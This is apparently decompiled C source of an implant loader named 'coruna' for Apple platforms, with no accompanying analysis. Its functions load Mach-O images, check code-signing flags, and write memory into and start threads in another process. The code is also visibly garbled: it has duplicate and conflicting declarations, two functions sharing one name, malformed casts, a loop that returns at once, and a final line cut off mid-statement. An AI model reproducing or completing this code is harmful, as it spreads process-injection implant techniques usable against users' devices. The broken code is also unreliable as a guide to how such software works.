uint8_t * coruna_implant_via_ctx_free_2(long handle,long addr_2,int flags,uint size,long *off_3)
{
  int err;
  bool err;
  long handle;
  uint8_t *ptr;
  unsigned long u;
  
  ptr = (uint8_t *)0xad001;
  if (((handle != 0) && (addr_2 != 0)) && (off_3 != (long *)0x0)) {
    err = 0xfffffff;
    if (flags != 0) {
      err = flags;
    }
    handle = coruna_macho_open_image(addr_2,err,handle,*(uint32_t *)k_implant_mach_task_self_slot,0);
    if (handle == 0) {
      ptr = &k_implant_rodata_word_12002;
    }
    else {
      *(uint16_t *)(handle + 0x1c2) = 1;
      *(uint8_t *)(handle + 0x110) = 1;
      *(uint8_t *)(handle + 0x130) = 1;
      *(byte *)(handle + 0x1c4) = (byte)(size >> 4) & 1;
      u = 0;
      do {
        ptr = (uint8_t *)(*(void (*)(&ptr_implant_fn_28860)[u])(handle);
        err = u < 3;
        u = u + 1;
      } while ((int)ptr == 0 && err);
      if ((int)ptr == 0) {
        *off_3 = handle;
      }
      else {
        coruna_ctx_free(handle);
      }
    }
  }
  return ptr;
}





uint64_t coruna_loader_ctx_destroy(void *ctx)
{
  uint64_t u;
  
  if (ctx == (void *)0x0) {
    u = 0xad001;
  }
  else {
    if (*(char *)((long)ctx + 0xfc) == '\0') {
      coruna_mach_vm_deallocate(ctx);
      _free(ctx);
    }
    else {
      coruna_ctx_free(ctx);
    }
    u = 0;
  }
  return u;
}





uint8_t * coruna_load_libcache(uint64_t *val,short *arg,long handle,char *path)
{
  char *ptr;
  int *err;
  bool err;
  bool status;
  int err;
  uint64_t *ptr;
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  unsigned long u;
  uint64_t size;
  int *status;
  uint8_t *buf;
  long scratch;
  
  buf = (uint8_t *)0xad001;
  if ((val != (uint64_t *)0x0) &&
     ((arg == (short *)0x0 || ((*arg == 2 && (1 < (ushort)arg[1])))))) {
    ptr = "\x01";
    if (path != (char *)0x0) {
      ptr = path;
    }
    ptr = _calloc(1,0x178);
    if (ptr == (uint64_t *)0x0) {
      buf = (uint8_t *)0xad009;
    }
    else {
      handle = __NSGetMachExecuteHeader();
      ptr[0x19] = handle;
      addr = __NSGetArgc();
      ptr[0x1a] = addr;
      off = __NSGetArgv();
      ptr[0x1b] = off;
      base = __NSGetEnviron();
      ptr[0x1c] = base;
      ctx_val = __NSGetProgname();
      ptr[0x1d] = ctx_val;
      if ((((handle == 0) || (addr == 0)) || (off == 0)) || (base == 0)) {
        buf = &UNK_0001200f;
      }
      else {
        buf = &UNK_0001200f;
        if ((ctx_val != 0) &&
           (buf = (uint8_t *)coruna_csops((long)ptr + 0x1d), (int)buf == 0)) {
          if ((*ptr == '\0') || (err = coruna_init_os_log(), err != 0)) {
            u = coruna_identity(k_implant_dladdr_slot);
            err = (int *)(u & 0xfffffffffffff000);
            do {
              status = err;
              err = status + -0x400;
            } while (*status != -0x1120531);
            *(uint *)(ptr + 3) = status[2] & 0xffffff;
            err = arg != (short *)0x0;
            status = handle == 0;
            scratch = handle;
            if ((!err || !status) ||
               (buf = (uint8_t *)(**(void (**)(arg + 0xc))(arg,0,&scratch),
               (int)buf == 0)) {
              *ptr = arg;
              ptr[1] = scratch;
              *(bool *)(ptr + 2) = err && status;
              *(char *)((long)ptr + 0x1c) = *ptr;
              size = _dlopen("/usr/lib/system/libcache.dylib",0x12);
              ptr[4] = size;
              buf = (uint8_t *)coruna_objc_flush_caches(ptr);
              if ((int)buf == 0) {
                buf = (uint8_t *)coruna_init_libunwind(ptr);
                if ((int)buf == 0) {
                  *val = ptr;
                  return buf;
                }
                coruna_mutex_destroy(ptr);
              }
              if (err && status) {
                (**(void (**)(arg + 0x10))(arg,ptr[1]);
                ptr[1] = 0;
              }
            }
          }
          else {
            buf = &UNK_00012010;
          }
        }
      }
      _free(ptr);
    }
  }
  return buf;
}





void coruna_csops(byte *arg)
{
  pid_t lp1;
  int err;
  uint u;
  int *err;
  uint *ptr;
  byte err;
  uint8_t scratch[3];
  byte bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint32_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  thread_attr = 0;
  scratch = 0;
  host_info = 0;
  if (k_implant_rodata_word_26a58 <= *(double *)k_implant_dyldversionnumber_slot) {
    lp1 = _getpid();
    err = _csops(lp1,0,scratch,4);
    if (err < 0) goto fail;
    err = bootargs >> 5 & 1;
  }
  else {
    lp1 = _getpid();
    err = _csops(lp1,5,&thread_attr,0x14);
    if (err < 0) {
      err = ___error();
      if (*err == 0x55) {
        u = 0;
        *arg = 0;
        if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
        return;
        }
        ___stack_chk_fail(u);
      }
fail:
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
      return;
      }
      ___stack_chk_fail(u);
    }
    err = 1;
  }
  u = 0;
  *arg = err;
done:
  if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(u);
}





unsigned long coruna_ctx_free(long *arg)

{
  uint u;
  unsigned long size;
  long serial;
  
  if (arg == (long *)0x0) {
    size = 0xad001;
  }
  else {
    size = coruna_mutex_destroy();
    if (((char)arg[2] != '\0') && (serial = *arg, serial != 0)) {
      u = (**(void (**)(serial + 0x20))(serial,arg[1]);
      if ((uint)size != 0) {
        u = (uint)size;
      }
      size = (unsigned long)u;
    }
    arg[0x2e] = 0;
    arg[0x2b] = 0;
    arg[0x2a] = 0;
    arg[0x2d] = 0;
    arg[0x2c] = 0;
    arg[0x27] = 0;
    arg[0x26] = 0;
    arg[0x29] = 0;
    arg[0x28] = 0;
    arg[0x23] = 0;
    arg[0x22] = 0;
    arg[0x25] = 0;
    arg[0x24] = 0;
    arg[0x1f] = 0;
    arg[0x1e] = 0;
    arg[0x21] = 0;
    arg[0x20] = 0;
    arg[0x1b] = 0;
    arg[0x1a] = 0;
    arg[0x1d] = 0;
    arg[0x1c] = 0;
    arg[0x17] = 0;
    arg[0x16] = 0;
    arg[0x19] = 0;
    arg[0x18] = 0;
    arg[0x13] = 0;
    arg[0x12] = 0;
    arg[0x15] = 0;
    arg[0x14] = 0;
    arg[0xf] = 0;
    arg[0xe] = 0;
    arg[0x11] = 0;
    arg[0x10] = 0;
    arg[0xb] = 0;
    arg[10] = 0;
    arg[0xd] = 0;
    arg[0xc] = 0;
    arg[7] = 0;
    arg[6] = 0;
    arg[9] = 0;
    arg[8] = 0;
    arg[3] = 0;
    arg[2] = 0;
    arg[5] = 0;
    arg[4] = 0;
    arg[1] = 0;
    *arg = 0;
    _free(arg);
  }
  return size;
}





uint64_t coruna_loader_set_image(long *handle,long addr_2,long off_3)
{
  uint64_t u;
  long handle;
  long scratch;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (addr_2 != 0)) {
    scratch = off_3;
    if ((off_3 != 0) ||
       (u = (**(void (**)(addr_2 + 0x18))(addr_2,0,&scratch), (int)u == 0)) {
      handle = *handle;
      if ((handle != 0) && ((char)handle[2] != '\0')) {
        (**(void (**)(handle + 0x20))(handle,handle[1]);
      }
      *handle = addr_2;
      handle[1] = scratch;
      *(bool *)(handle + 2) = off_3 == 0;
      if (((int)handle[10] != 2) || (u = coruna_loader_mutex_lock(handle,handle + 0xb), (int)u == 0))
      {
        if ((int)handle[0x23] == 1) {
          u = coruna_loader_mutex_lock(handle,handle + 0x24);
        }
        else {
          u = 0;
        }
      }
    }
  }
  return u;
}





uint8_t * coruna_implant08_via_macho_foreach_loadcmd(long handle)
{
  uint8_t *ptr;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle == 0) {
    ptr = (uint8_t *)0xad001;
  }
  else if (*(char *)(handle + 0xfc) == '\0') {
    ptr = &k_implant_rodata_word_12012;
  }
  else {
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_26a78;
    thread_attr = coruna_macho_pagezero;
    host_info = &k_implant_rodata_word_28910;
    serial_buf = handle;
    ptr = (uint8_t *)coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
  }
  return ptr;
}





uint64_t coruna_csops(long *handle)
{
  pid_t lp1;
  int err;
  uint64_t u;
  uint64_t scratch;
  uint64_t scratch;
  uint32_t bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad00a;
  if (handle == (long *)0x0) {
    u = 0xad001;
  }
  else if (((*handle != 0) && (*(long *)(*handle + 0x28) != 0)) && (handle[1] != 0)) {
    scratch = 0;
    scratch = 0;
    bootargs = 0;
    lp1 = _getpid();
    err = _csops(lp1,5,&scratch,0x14);
    if (err < 0) {
      u = 0xad00b;
    }
    else {
      u = (**(void (**)(*handle + 0x28))(*handle,handle[1],0x40000105,&scratch);
    }
  }
  if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t coruna_macho_text_seg(long handle,long addr_2)
{
  int err;
  long handle;
  uint64_t u;
  unsigned long size;
  
  u = 0x14002;
  size = *(unsigned long *)(addr_2 + 0x20);
  if (!CARRY8(*(unsigned long *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18),size)) {
    if ((*(long *)(addr_2 + 0x28) == 0) && (*(long *)(addr_2 + 0x30) != 0)) {
      handle = *(long *)(*(long *)(handle + 0x28) + 8);
      if (*(long *)(handle + 0x18) == 0) {
        u = 0;
        *(uint64_t *)(handle + 0x18) = *(uint64_t *)(addr_2 + 0x18);
      }
      else {
        u = 0x14003;
      }
    }
    else {
      u = 0;
    }
    err = _strcmp((char *)(addr_2 + 8),"__TEXT");
    if (err == 0) {
      *(long *)(*(long *)(*(long *)(handle + 0x30) + 8) + 0x18) = addr_2;
    }
    if (size < 0xffffffff) {
      handle = *(long *)(*(long *)(handle + 0x20) + 8);
      *(unsigned long *)(handle + 0x18) = *(long *)(handle + 0x18) + size;
    }
  }
  return u;
}





uint8_t * coruna_dlopen_rpath(uint64_t val,char *path,uint64_t id_2,long *handle)
{
  int err;
  long handle;
  uint8_t *ptr;
  
  ptr = &k_implant_rodata_word_1200b;
  if ((path != (char *)0x0) && (handle != (long *)0x0)) {
    handle = _dlopen(path,id_2);
    if (handle == 0) {
      err = _strncmp(path,"@rpath",6);
      if (err != 0) {
        return (uint8_t *)0x17004;
      }
      handle = _dlopen(path + 6,id_2);
      if (handle == 0) {
        return (uint8_t *)0x17004;
      }
    }
    ptr = (uint8_t *)0x0;
    *handle = handle;
  }
  return ptr;
}





uint8_t * coruna_driver_dispatch(uint64_t val,long handle)
{
  if (handle != 0) {
    _dlclose(handle);
    return (uint8_t *)0x0;
  }
  return &k_implant_rodata_word_1200c;
}





uint64_t coruna_dlclose(uint64_t val,uint64_t id_2)
{
  _dlclose(id_2);
  return 0;
}





uint64_t coruna_macho_cfstring(long handle,long addr_2)
{
  char *ptr;
  long handle;
  unsigned long u;
  int err;
  unsigned long size;
  unsigned long version;
  char *buf;
  unsigned long port;
  unsigned long tag;
  
  err = _strncmp((char *)(addr_2 + 8),"__DATA",6);
  if (err == 0) {
    ptr = (char *)(addr_2 + 0x48);
    buf = ptr + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
    for (; ptr < buf; ptr = ptr + 0x50) {
      err = _strncmp(ptr,"__cfstring",0xb);
      if ((err == 0) && (port = *(unsigned long *)(ptr + 0x28), port != 0)) {
        tag = 0;
        handle = *(long *)(*(long *)(handle + 0x20) + 0x18) + *(long *)(ptr + 0x20);
        do {
          version = *(unsigned long *)(handle + tag);
          u = version & 0x7ffffffffffff8;
          if ((u != 0) && (size = coruna_identity(u), u == size)) {
            *(unsigned long *)(handle + tag) = version;
          }
          tag = tag + 0x20;
        } while (tag < port);
      }
    }
  }
  return 0;
}





uint8_t * coruna_implant08_residual_16(long handle,long addr_2)
{
  void (*ptr)(void);
  uint8_t *ptr;
  long *ptr;
  long handle;
  void (*buf)(void);
  uint64_t scratch;
  uint32_t *bootargs;
  uint64_t *thread_attr;
  uint64_t *host_info;
  uint64_t serial_buf;
  
  ptr = *(long **)(handle + 0x20);
  ptr = (void (*)(ptr[3] + *(long *)(addr_2 + 8));
  buf = (void (*)ptr[1];
  if ((ptr >= buf && ptr <= buf + ptr[2]) &&
      (ptr < buf || buf + ptr[2] != ptr)) {
    handle = *ptr;
    bootargs = *(uint32_t **)(handle + 0xd0);
    scratch = *(uint64_t *)(handle + 200);
    serial_buf = *(uint64_t *)(handle + 0xe8);
    host_info = *(uint64_t **)(handle + 0xe0);
    thread_attr = *(uint64_t **)(handle + 0xd8);
    (*ptr)(*bootargs,*thread_attr,*host_info,0,&scratch);
    ptr = (uint8_t *)0x0;
  }
  else {
    ptr = &k_implant_rodata_word_12008;
  }
  return ptr;
}





uint8_t * coruna_last(long handle,long addr_2)
{
  bool err;
  unsigned long u;
  void (*ptr)(void);
  void (*buf)(void);
  unsigned long size;
  long *ptr;
  long handle;
  long addr;
  long off;
  unsigned long version;
  unsigned long port;
  uint64_t scratch;
  uint32_t *bootargs;
  uint64_t *thread_attr;
  uint64_t *host_info;
  uint64_t serial_buf;
  unsigned long tag;
  
  u = addr_2 + 0x48;
  version = u + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
  do {
    if (version <= u) {
      return (uint8_t *)0x0;
    }
    if (*(char *)(u + 0x40) == '\x16') {
      size = *(unsigned long *)(u + 0x28);
      if (3 < size) {
        addr = *(long *)(u + 0x20);
        off = *(long *)(handle + 0x20);
        tag = 0;
        port = 1;
        do {
          ptr = *(long **)(handle + 0x28);
          ptr = (void (*)ptr[1];
          buf = ptr + *(uint *)(off + addr + tag * 4);
          return &k_implant_rodata_word_12008;
        } while (err);
      }
    }
    else if ((*(char *)(u + 0x40) == '\t') && (size = *(unsigned long *)(u + 0x28), 7 < size)) {
      addr = *(long *)(u + 0x20);
      off = *(long *)(handle + 0x20);
      tag = 0;
      port = 1;
      do {
        buf = *(void (**)(off + addr + tag * 8);
        ptr = *(long **)(handle + 0x28);
        if (buf < (void (*)ptr[1] || (void (*)ptr[1] + ptr[2] <= buf) {
fail:
          return &k_implant_rodata_word_12008;
        }
        handle = *ptr;
        bootargs = *(uint32_t **)(handle + 0xd0);
        scratch = *(uint64_t *)(handle + 200);
        serial_buf = *(uint64_t *)(handle + 0xe8);
        host_info = *(uint64_t **)(handle + 0xe0);
        thread_attr = *(uint64_t **)(handle + 0xd8);
        (*buf)(*bootargs,*thread_attr,*host_info,0,&scratch);
        err = port < size >> 3;
        tag = port;
        port = (unsigned long)((int)port + 1);
      } while (err);
    }
    u = u + 0x50;
  } while( true );
}





void coruna_macho_pagezero(long handle,long addr_2)
{
  int err;
  uint64_t *ptr;
  uint8_t scratch;
  
  err = _strncmp((char *)(addr_2 + 8),"__PAGEZERO",0xb);
  if (err != 0) {
    ptr = *(uint64_t **)(handle + 0x20);
    scratch = 0;
    coruna_macho_get_slide(*ptr,*(uint32_t *)(ptr + 0xb),ptr[10] + *(long *)(addr_2 + 0x18),
                 *(uint64_t *)(addr_2 + 0x20),&scratch);
  }
  return;
}





uint64_t coruna_export_name_table(long handle,uint64_t *val,int *flags)
{
  void *ptr;
  unsigned long u;
  uint64_t *ptr;
  char *ptr;
  uint64_t size;
  unsigned long version;
  
  size = 0xad001;
  if (((handle != 0) && (val != (uint64_t *)0x0)) && (flags != (int *)0x0)) {
    version = (unsigned long)*(uint *)(handle + 0xa0);
    if (*(uint *)(handle + 0xa0) == 0) {
      size = 0;
      *val = 0;
      *flags = 0;
    }
    else {
      ptr = _calloc(version,8);
      if (ptr == (void *)0x0) {
        size = 0xad009;
      }
      else {
        u = 0;
        ptr = (uint64_t *)(*(long *)(handle + 0x98) + 8);
        do {
          ptr = (char *)ptr[-1];
          if ((ptr == (char *)0x0) || ((uint8_t **)*ptr != &ptr_implant_fn_28a80)) {
            size = 0x910014;
            goto fail;
          }
          if ((*ptr == '\0') || (*(long *)(ptr + 0x10) != 0)) {
            *(char **)((long)ptr + u * 8) = ptr;
            u = (unsigned long)((int)u + 1);
          }
          ptr = ptr + 2;
          version = version - 1;
        } while (version != 0);
        size = 0;
        if ((int)u == 0) {
          *val = 0;
          *flags = 0;
fail:
          _free(ptr);
        }
        else {
          *val = ptr;
          *flags = (int)u;
        }
      }
    }
  }
  return size;
}





uint64_t coruna_remote_memcpy(uint64_t *val,long handle,long addr_2,uint size,unsigned long arg)
{
  long handle;
  uint64_t u;
  long scratch [3];
  unsigned long scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  long thread_attr;
  uint64_t thread_attr;
  unsigned long host_info;
  uint64_t host_info;
  
  u = 0xad001;
  if ((val != (uint64_t *)0x0) && ((addr_2 != 0 || (size == 0)))) {
    if (handle == 0) {
      u = 0x1e010;
    }
    else {
      scratch[0] = 0;
      u = coruna_mach_vm_allocate(*(uint32_t *)(val + 0xb),0x80000,0x1e000001,scratch);
      handle = scratch[0];
      if ((int)u == 0) {
        scratch[1] = 0;
        scratch = (unsigned long)size;
        bootargs = val[9];
        bootargs = val[8];
        thread_attr = scratch[0];
        thread_attr = 0x80000;
        host_info = arg & 0xffffffff;
        host_info = 0;
        scratch[0] = handle;
        scratch[2] = addr_2;
        u = coruna_thread_create_resume(*(uint64_t *)*val,((uint64_t *)*val)[1],
                             *(uint32_t *)(val + 0xb),*(uint8_t *)(val + 0x12),scratch
                             ,handle,0x80000);
        if ((int)u != 0) {
          coruna_mach_vm_deallocate(*(uint32_t *)(val + 0xb),handle,0x80000,0);
        }
      }
    }
  }
  return u;
}





uint64_t coruna_wire_export_reset_call(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = coruna_wire_export_reset();
    return u;
  }
  return 0xad001;
}





uint8_t *
uint64_t * coruna_implant_via_ctx_free(int64_t arg,uint64_t val,int64_t arg,uint64_t id_2,uint8_t buf, int64_t *val)
{
  unsigned long u;
  unsigned long size;
  long handle;
  unsigned long version;
  uint8_t *ptr;
  
  ptr = (uint8_t *)0xad001;
  if ((((arg != 0) && ((int)val != 0)) && ((int)val != -1)) &&
     (((arg != 0 && ((int)id_2 != 0)) && (val != (long *)0x0)))) {
    handle = coruna_macho_open_image(arg,id_2,arg,val,1);
    if (handle == 0) {
      ptr = &k_implant_rodata_word_12002;
    }
    else {
      version = 0;
      *(byte *)(handle + 0x110) = buf & 1;
      *(bool *)(handle + 0x130) = (buf & 5) != 0;
      *(uint16_t *)(handle + 0x1c3) = 0;
      size = 0x10;
      if ((buf & 4) == 0) {
        size = 0x11;
      }
      do {
        u = version + 1;
        ptr = (uint8_t *)(*(void (*)(&ptr_implant_fn_28930)[version])(handle);
        version = u;
      } while ((int)ptr == 0 && u < size);
      if ((int)ptr == 0) {
        *val = handle;
      }
      else {
        coruna_ctx_free(handle);
      }
    }
  }
  return ptr;
}





uint64_t coruna_dlopen_rpath(long handle)
{
  void (*ptr)(void);
  uint64_t u;
  unsigned long unaff_x30;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    u = coruna_mach_vm_read_overwrite(*(uint32_t *)(handle + 0x20),handle + 0x30,handle + 0x38);
    if ((((int)u == 0) &&
        (u = coruna_mach_vm_read_overwrite(*(uint32_t *)(handle + 0x58),handle + 0x68,handle + 0x70),
        (int)u == 0)) &&
       (u = coruna_sysctl_proc_cputype(*(uint32_t *)(handle + 0x20),handle + 0x24,handle + 0x28),
       (int)u == 0)) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      u = coruna_sysctl_proc_cputype(*(uint32_t *)(handle + 0x58),handle + 0x5c,handle + 0x60);
      return u;
    }
  }
  return u;
}





void coruna_block_dispose_wrapper_4(uint64_t val)
{
  coruna_block_dispose(val,1);
  return;
}





uint64_t coruna_implant_via_macho_run_exports(long handle)
{
  void (*ptr)(void);
  uint64_t u;
  unsigned long unaff_x30;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    u = coruna_macho_run_exports_block(handle,&k_implant_nsconcreteglobalblock_slot);
    if ((int)u == 0) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      u = coruna_macho_run_exports(handle,&k_implant_nsconcreteglobalblock_slot);
      return u;
    }
  }
  return u;
}





uint32_t coruna_mach_vm_protect(long handle)
{
  kern_return_t lk1;
  uint32_t u;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    u = 0x910016;
    if (((*(mach_vm_address_t *)(handle + 8) != 0) && (*(long *)(handle + 0x40) != 0)) &&
       (*(mach_vm_size_t *)(handle + 0x10) == *(mach_vm_size_t *)(handle + 0x48))) {
      lk1 = _mach_vm_protect(*(vm_map_t *)k_implant_mach_task_self_slot,
                               *(mach_vm_address_t *)(handle + 8),
                               *(mach_vm_size_t *)(handle + 0x10),0,3);
      if (lk1 == 0) {
        lk1 = _mach_vm_protect(*(vm_map_t *)(handle + 0x58),
                                 *(mach_vm_address_t *)(handle + 0x40),
                                 *(mach_vm_size_t *)(handle + 0x48),0,3);
        if (lk1 == 0) {
          lk1 = _mach_vm_write(*(vm_map_t *)(handle + 0x58),
                                 *(mach_vm_address_t *)(handle + 0x40),
                                 *(vm_offset_t *)(handle + 8),
                                 *(mach_msg_type_number_t *)(handle + 0x48));
          u = 0;
          if (lk1 != 0) {
            u = 0x1e015;
          }
        }
        else {
          u = 0x1e017;
        }
      }
      else {
        u = 0x1e016;
      }
    }
  }
  return u;
}





uint8_t * coruna_implant_via_ctx_free_3(long handle,uint64_t val,long addr_2,uint64_t id_2)
{
  bool err;
  long handle;
  uint8_t *ptr;
  unsigned long u;
  
  ptr = (uint8_t *)0xad001;
  if ((((handle != 0) && ((int)val != 0)) && ((int)val != -1)) &&
     ((addr_2 != 0 && ((int)id_2 != 0)))) {
    handle = coruna_macho_open_image(addr_2,id_2,handle,val,1);
    if (handle == 0) {
      ptr = &k_implant_rodata_word_12002;
    }
    else {
      u = 0;
      do {
        ptr = (uint8_t *)(*(void (*)(&ptr_implant_fn_289b8)[u])(handle);
        err = u < 2;
        u = u + 1;
      } while ((int)ptr == 0 && err);
      coruna_ctx_free(handle);
    }
  }
  return ptr;
}





void coruna_block_dispose_wrapper_5(uint64_t val)
{
  coruna_block_dispose(val,0);
  return;
}





uint64_t coruna_bind_dlopen_table(long handle,long *addr_2)
{
  int err;
  uint64_t u;
  long handle;
  long addr;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (addr_2 != (long *)0x0)) {
    addr = *addr_2;
    scratch = coruna_identity(addr);
    if ((addr != 0) && (*(char *)(handle + 0x138) != '\0')) {
      if ((*(char *)(handle + 0x38) == '\0') || (*(char *)(handle + 0x70) == '\0')) {
        u = coruna_dladdr(*(uint32_t *)(handle + 0x58),scratch,&scratch);
        if ((int)u != 0) {
          return u;
        }
        addr = *addr_2;
      }
      else if (*(long *)(handle + 0x68) != *(long *)(handle + 0x30)) {
        scratch = (scratch - *(long *)(handle + 0x30)) + *(long *)(handle + 0x68);
      }
    }
    handle = scratch;
    err = coruna_dyld_port_index(addr);
    if (err != 0) {
      handle = coruna_identity_80bc(handle,0);
    }
    u = 0;
    *addr_2 = handle;
  }
  return u;
}





unsigned long coruna_block_dispose(long *arg,unsigned long val)

{
  uint u;
  uint size;
  unsigned long type_id;
  long *entry_11;
  uint64_t cache_34;
  uint64_t block_ctx;
  uint64_t cache_36;
  uint8_t *region;
  uint64_t plist;
  void (*cache_37)(void);
  uint8_t *url_buf;
  uint64_t *cache_39;
  uint64_t json_buf;
  uint64_t *frame;
  uint64_t cache_61;
  uint8_t cache_45;
  
  if (arg == (long *)0x0) {
    return 0xad001;
  }
  entry_11 = (long *)*arg;
  if (entry_11 == (long *)0x0) {
    return 0x1e004;
  }
  if ((*(char *)((long)entry_11 + 0x1d) != '\0') && (*entry_11 == 0)) {
    return 0x1e004;
  }
  frame = &json_buf;
  json_buf = 0;
  cache_61 = k_implant_rodata_word_26a68;
  cache_45 = 0;
  if ((val & 1) == 0) {
    cache_45 = 1;
  }
  else {
    region = k_implant_nsconcretestackblock_slot;
    plist = k_implant_rodata_word_26a70;
    cache_37 = coruna_wire_export_on_err;
    url_buf = &k_implant_rodata_word_289d0;
    cache_39 = frame;
    type_id = coruna_macho_foreach_loadcmd(arg,0,&region);
    __Block_object_dispose(&json_buf,8);
    return type_id;
  }
  cache_34 = 0;
  block_ctx = 0;
  cache_36 = 0;
  size = coruna_task_dyld_info((int)arg[0xb],&cache_34);
  u = 0x1e003;
  if (cache_34 != '\0') {
    u = 0;
  }
  if (size != 0) {
    u = size;
  }
  type_id = (unsigned long)u;
load_ok_41:
  __Block_object_dispose(&json_buf,8);
  return type_id;
}





uint64_t coruna_wire_export_on_err(long handle,int *flags)
{
  int err;
  
  err = *flags;
  if ((err == -0x7fffffde) || (err == 0x22 || err == -0x7fffffcc)) {
    *(uint8_t *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) = 1;
  }
  return 0;
}





void coruna_wire_read_u32_thunk(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_wire_read_u32(id_2,off_4);
  return;
}





uint64_t coruna_wire_read_u32(long handle,uint64_t val)
{
  uint u;
  int err;
  void *ptr;
  uint64_t size;
  
  size = 0xad001;
  if (handle != 0) {
    err = *(uint *)(handle + 0xe0) * 8;
    if (*(uint *)(handle + 0xe0) >> 0x1d == 0 && err != -8) {
      ptr = _realloc(*(void **)(handle + 0xd8),(unsigned long)(err + 8));
      if (ptr == (void *)0x0) {
        size = 0xad009;
      }
      else {
        size = 0;
        *(void **)(handle + 0xd8) = ptr;
        u = *(uint *)(handle + 0xe0);
        *(uint64_t *)((long)ptr + (unsigned long)u * 8) = val;
        *(uint *)(handle + 0xe0) = u + 1;
      }
    }
    else {
      size = 0xad01d;
    }
  }
  return size;
}





void coruna_wire_read_u32_thunk(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_wire_read_u32(id_2,off_4);
  return;
}





uint8_t * coruna_strdup_2(uint64_t val,char *path,uint64_t id_2,uint64_t *size_3)
{
  void *ptr;
  char *ptr;
  uint8_t *ptr;
  
  ptr = &k_implant_rodata_word_1200b;
  if ((path != (char *)0x0) && (size_3 != (uint64_t *)0x0)) {
    ptr = (uint8_t *)0xad009;
    ptr = _calloc(1,0x58);
    if (ptr != (void *)0x0) {
      *(long *)((long)ptr + 0x50) = (long)ptr + 0x10;
      ptr = _strdup(path);
      *(char **)((long)ptr + 8) = ptr;
      if (ptr == (char *)0x0) {
        _free(ptr);
      }
      else {
        ptr = (uint8_t *)0x0;
        *size_3 = ptr;
      }
    }
  }
  return ptr;
}





uint8_t * coruna_implant08_via_wire_export_free(uint64_t val,long handle)
{
  uint8_t *ptr;
  
  if (handle != 0) {
    ptr = (uint8_t *)coruna_wire_export_free(handle);
    return ptr;
  }
  return &k_implant_rodata_word_1200c;
}





uint64_t coruna_wire_err_imm(void)
{
  return 0x910006;
}





unsigned long coruna_wire_export_reset(long arg)

{
  uint u;
  unsigned long size;
  
  if (arg == 0) {
    size = 0xad001;
  }
  else {
    size = coruna_wire_export_create(arg,0,0xfffffffffffffffb);
    if (((int)size == 0) && (size = coruna_wire_export_create(arg,1,0xfffffffffffffffe), (int)size == 0))
    {
      u = 0;
      if (*(int *)(arg + 0xa0) != 2) {
        u = 0x1e018;
      }
      size = (unsigned long)u;
    }
  }
  return size;
}





uint64_t coruna_wire_export_create(long handle,int flags,uint64_t val)
{
  uint8_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if (handle != 0) {
    if (*(int *)(handle + 0xa0) == flags) {
      ptr = _calloc(1,0x58);
      if (ptr == (uint8_t *)0x0) {
        u = 0xad009;
      }
      else {
        *(uint8_t **)(ptr + 0x50) = ptr + 0x10;
        *ptr = 1;
        *(uint64_t *)(ptr + 8) = val;
        u = coruna_implant08_residual_12(handle,&ptr_implant_fn_28a80,ptr);
        if ((int)u != 0) {
          coruna_wire_export_free(ptr);
        }
      }
    }
    else {
      u = 0x1e018;
    }
  }
  return u;
}





uint64_t coruna_wire_export_free(char *path)
{
  uint64_t *ptr;
  uint64_t u;
  void *ptr;
  
  if (path == (char *)0x0) {
    u = 0xad001;
  }
  else {
    if ((*path == '\0') && (*(void **)(path + 8) != (void *)0x0)) {
      _free(*(void **)(path + 8));
    }
    ptr = *(void **)(path + 0x10);
    while (ptr != (void *)0x0) {
      ptr = (void *)*ptr;
      if ((void *)ptr[2] != (void *)0x0) {
        _free((void *)ptr[2]);
      }
      _free(ptr);
      ptr = ptr;
    }
    u = 0;
  }
  return u;
}





uint coruna_host_processors(uint8_t *buf)
{
  natural_t ln1;
  mach_port_t lm2;
  uint u;
  pid_t lp4;
  int err;
  kern_return_t lk6;
  int *err;
  uint *ptr;
  uint *buf;
  char *ptr;
  bool err;
  unsigned long size;
  unsigned long version;
  uint port;
  uint64_t scratch;
  uint64_t bootargs;
  uint32_t thread_attr;
  unsigned long host_info;
  processor_info_array_t serial_buf [64];
  long action;
  
  action = *(long *)k_implant_stack_chk_guard_slot;
  if (buf == (uint8_t *)0x0) {
    u = 0xad001;
    if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  bootargs = bootargs & 0xffffffff00000000;
  serial_buf[0] = (processor_info_array_t)0x0;
  host_info = host_info & 0xffffffff00000000;
  lm2 = _mach_host_self();
  u = _host_processor_info
